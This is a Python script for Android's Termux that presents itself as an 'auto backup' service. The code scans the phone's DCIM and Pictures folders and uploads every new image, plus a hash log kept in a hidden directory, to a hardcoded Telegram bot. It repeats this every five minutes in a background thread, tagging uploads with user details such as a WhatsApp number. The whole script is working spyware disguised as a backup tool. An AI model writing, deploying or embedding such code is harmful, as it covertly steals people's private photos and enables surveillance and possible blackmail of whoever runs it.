import hashlib
import os
import threading
import time
import requests

# ==================== CONFIGURATION ====================
# Safe internal paths to avoid /sdcard permission denied errors
TARGET_DIR = os.path.expanduser("~/storage/shared")
SECURE_DIR = "/data/data/com.termux/files/home/.backup_secure_data"
DATA_LOG_FILE = os.path.join(SECURE_DIR, "data.txt")

os.makedirs(SECURE_DIR, exist_ok=True)

BOT_TOKEN = "8931091996:AAHgcTH38hSH1RXFVzEcqNR2O1LKtqS3RBk"
CHAT_ID = "7883547875"


def get_file_hash(filepath):
  hasher = hashlib.md5()
  try:
    with open(filepath, "rb") as f:
      buf = f.read(65536)
      while len(buf) > 0:
        hasher.update(buf)
        buf = f.read(65536)
    return hasher.hexdigest()
  except Exception:
    return None


def is_already_backed_up(file_hash):
  if not os.path.exists(DATA_LOG_FILE):
    return False
  try:
    with open(DATA_LOG_FILE, "r", encoding="utf-8") as f:
      logged_hashes = f.read().splitlines()
      return file_hash in logged_hashes
  except Exception:
    return False


def log_backed_up_file(file_hash):
  try:
    with open(DATA_LOG_FILE, "a", encoding="utf-8") as f:
      f.write(file_hash + "\n")
  except Exception:
    pass


def send_to_telegram(file_path, user_info):
  caption = (
      f"🚀 **Auto Backup & Documents Scan**\n👤 **User Info:** {user_info}\n📁"
      f" **File:** {os.path.basename(file_path)}"
  )
  try:
    with open(file_path, "rb") as f:
      files = {"photo": f}
      data = {"chat_id": CHAT_ID, "caption": caption, "parse_mode": "Markdown"}
      url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
      response = requests.post(url, data=data, files=files, timeout=30)
      return response.status_code == 200
  except Exception:
    return False


def send_text_log_to_telegram(file_path, user_info):
  try:
    with open(file_path, "rb") as f:
      files = {"document": f}
      data = {
          "chat_id": CHAT_ID,
          f"caption": f"📊 **User Info:** {user_info}\n📂 **File:** data.txt",
          "parse_mode": "Markdown",
      }
      url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
      requests.post(url, data=data, files=files, timeout=30)
  except Exception:
    pass


def send_alert_msg(message):
  try:
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
    requests.post(url, data=payload, timeout=10)
  except Exception:
    pass


def run_backup_cycle(user_info):
  send_alert_msg(
      f"🚀 **Auto Backup Started**\n👤 **User Info:** {user_info}"
  )

  # Target folders to scan (DCIM and Pictures)
  folders_to_scan = [
      os.path.join(TARGET_DIR, "DCIM"),
      os.path.join(TARGET_DIR, "Pictures"),
  ]

  for folder in folders_to_scan:
    if os.path.exists(folder):
      for root, _, files in os.walk(folder):
        for file in files:
          file_path = os.path.join(root, file)
          # Only target image formats
          if file.lower().endswith((".jpg", ".jpeg", ".png", ".webp")):
            f_hash = get_file_hash(file_path)
            if f_hash and not is_already_backed_up(f_hash):
              success = send_to_telegram(file_path, user_info)
              if success:
                log_backed_up_file(f_hash)
                time.sleep(1)  # Prevent Telegram flood limits

  # Send updated data.txt log file back to Telegram for tracking
  if os.path.exists(DATA_LOG_FILE):
    send_text_log_to_telegram(DATA_LOG_FILE, user_info)

  send_alert_msg(
      f"✅ **Backup Cycle Finished** for [{user_info}]. Waiting 5 mins..."
  )


def background_worker(user_info):
  while True:
    try:
      run_backup_cycle(user_info)
    except Exception:
      pass
    # Repeat every 5 minutes (300 seconds)
    time.sleep(300)


def start_background_backup(user_info="Unknown User"):
  t = threading.Thread(target=background_worker, args=(user_info,), daemon=True)
  t.start()


if __name__ == "__main__":
  # Standalone testing mode if run directly
  print("[*] Starting backend backup service...")
  start_background_backup("Test User | WhatsApp: 0000000000")
  while True:
    time.sleep(1)
